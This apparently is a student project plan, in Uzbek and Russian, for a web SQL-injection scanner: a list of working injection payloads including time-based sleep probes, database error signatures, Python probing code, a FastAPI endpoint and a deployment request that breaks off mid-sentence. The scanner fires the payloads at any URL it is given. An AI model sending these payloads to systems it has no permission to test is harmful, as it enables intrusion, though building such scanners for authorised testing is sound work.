'
''
"`
'--
'#
'/*
' OR '1'='1
' OR '1'='2
' OR 1=1
' OR 1=2
" OR "1"="1
' AND 1=1
' AND 1=2
' OR 'a'='a
' OR 'a'='b
' OR 1=1--
' OR 1=1#
' OR 1=1/*
' OR 1=1 LIMIT 1
' UNION SELECT NULL
' UNION SELECT 1
' UNION SELECT 1,2
' UNION SELECT 1,2,3
' UNION SELECT NULL,NULL
' UNION SELECT NULL,NULL,NULL
admin' --
admin' #
' OR sleep(5)--
' OR benchmark(1000000,md5(1))

Masalan user kiritadi:

http://testsite.com/product?id=1

Frontend backend’ga yuboradi:

POST /scan
{
 "url": "http://testsite.com/product?id=1"
}

Backend quyidagi ishlarni qiladi:

1. URL tekshiradi
2. URL parametrini aniqlaydi
3. Payloadlar yuboradi
4. Response tahlil qiladi
5. SQL error patternlarni tekshiradi
6. Response length solishtiradi
7. Vulnerable yoki Secure natija chiqaradi
2️⃣ Payload list (30 ta)
SQL_PAYLOADS = [
"'",
"''",
'"',
"'--",
"'#",
"'/*",
"' OR '1'='1",
"' OR '1'='2",
"' OR 1=1",
"' OR 1=2",
'" OR "1"="1',
"' AND 1=1",
"' AND 1=2",
"' OR 'a'='a",
"' OR 'a'='b",
"' OR 1=1--",
"' OR 1=1#",
"' OR 1=1/*",
"' OR 1=1 LIMIT 1",
"' UNION SELECT NULL",
"' UNION SELECT 1",
"' UNION SELECT 1,2",
"' UNION SELECT 1,2,3",
"' UNION SELECT NULL,NULL",
"' UNION SELECT NULL,NULL,NULL",
"admin' --",
"admin' #",
"' OR sleep(5)--",
"' OR benchmark(1000000,md5(1))",
"' OR 1=1 AND 'a'='a"
]
3️⃣ SQL Error patterns

Agar response ichida shu errorlar chiqsa → SQL Injection ehtimoli yuqori.

SQL_ERRORS = [
"sql syntax",
"mysql_fetch",
"syntax error",
"ORA-01756",
"unclosed quotation mark",
"SQLSTATE",
"Microsoft OLE DB",
"PostgreSQL",
"Warning: mysql",
"mysqli_fetch"
]
4️⃣ URL parameter parser

URL ichidan parametrni ajratamiz.

Masalan:

http://site.com/item?id=1

id=1 ni aniqlaymiz.

Python kodi:

from urllib.parse import urlparse, parse_qs

def extract_params(url):

    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    return params
5️⃣ Payload injection logikasi

Har bir payloadni parametrga qo‘shamiz.

Masalan:

id=1' OR 1=1

kod:

def inject_payload(url, payload):

    if "=" not in url:
        return None

    base, value = url.split("=")

    injected = f"{base}={value}{payload}"

    return injected
6️⃣ Response tahlil logikasi

Scanner 2 xil tekshiradi:

1️⃣ SQL error tekshiruv
def check_sql_error(response_text):

    for error in SQL_ERRORS:
        if error.lower() in response_text.lower():
            return True

    return False
2️⃣ Response length analysis

Ba’zi saytlar error bermaydi, lekin response o‘zgaradi.

def check_response_length(original, test):

    diff = abs(len(original) - len(test))

    if diff > 50:
        return True

    return False
7️⃣ Asosiy scanner logikasi
import requests

def run_sqli_scan(url):

    findings = []

    try:
        original = requests.get(url, timeout=10).text
    except:
        return {
            "status": "Error",
            "details": "Target unreachable"
        }

    for payload in SQL_PAYLOADS:

        injected_url = inject_payload(url, payload)

        if not injected_url:
            continue

        try:
            r = requests.get(injected_url, timeout=10)

            error_detected = check_sql_error(r.text)
            length_changed = check_response_length(original, r.text)

            if error_detected or length_changed:

                findings.append({
                    "payload": payload,
                    "url": injected_url
                })

        except:
            continue

    if findings:

        return {
            "status": "Vulnerable",
            "risk_level": "Critical",
            "findings": findings
        }

    else:

        return {
            "status": "Secure",
            "risk_level": "Low",
            "findings": []
        }
8️⃣ Backend API (FastAPI)
from fastapi import FastAPI
from pydantic import BaseModel

app = FastAPI()

class ScanRequest(BaseModel):
    url: str

@app.post("/scan")

def scan_target(req: ScanRequest):

    result = run_sqli_scan(req.url)

    return result
9️⃣ API response qanday bo‘ladi

Agar zaiflik topilsa:

{
 "status": "Vulnerable",
 "risk_level": "Critical",
 "findings": [
   {
     "payload": "' OR 1=1",
     "url": "http://site.com/product?id=1' OR 1=1"
   }
 ]
}

Agar topilmasa:

{
 "status": "Secure",
 "risk_level": "Low",
 "findings": []
}
🔟 Frontend workflow

Frontend (masalan React) quyidagicha ishlaydi:

User URL kiritadi
↓
RUN SECURITY AUDIT bosadi
↓
POST /scan
↓
Backend scan qiladi
↓
Natija qaytadi
↓
Dashboard ko‘rsatadi

Привет. Я отправляю тебе полный проект (zip). Посмотри пожалуйста структуру и код.

Сейчас система работает как demo scanner. Backend написан на FastAPI (server.py), frontend на React (Vite). Интерфейс и API уже работают — frontend отправляет запрос на /api/scan и backend возвращает результат.

Но сейчас в backend используется временная логика:

is_vulnerable = random.choice([True, False])

То есть система просто случайно возвращает Vulnerable или Secure. Это было сделано только для демонстрации интерфейса.

Нужно заменить эту часть на реальную SQL Injection scanning логику.

Я уже подготовил:

• список SQL payloads  
• SQL error patterns  
• response length analysis  
• scanner workflow

Задача backend логики должна быть следующая:

1. Получить URL из frontend
2. Определить параметры URL
3. Запустить SQL payload тесты
4. Отправить payload в target URL
5. Проанализировать response
6. Проверить SQL error patterns
7. Сравнить response length
8. Если есть признаки SQL Injection → вернуть Vulnerable
9. Если нет → вернуть Secure

Frontend уже умеет отображать logs и результат.

Также нужно:

• аккуратно встроить scanner логику в server.py
• чтобы API /api/scan возвращал реальные результаты
• убрать random.choice

После этого нужно подготовить проект для запуска.

Лучший вариант:

1. Залить проект в GitHub
2. Backend задеплоить на Render
3. Frontend оставить на Vercel или локально

Если проще — можно запустить всё локально через:

Backend:
python server.py

Frontend:
npm run dev

И уже эту версию показать на защите.

Посмотри пожалуйста проект и скажи:

• что стоит улучшить в архитектуре
• где лучше внедрить scanning логику
• как правильно задеплоить backend
• как лучше подготовить систему для демонс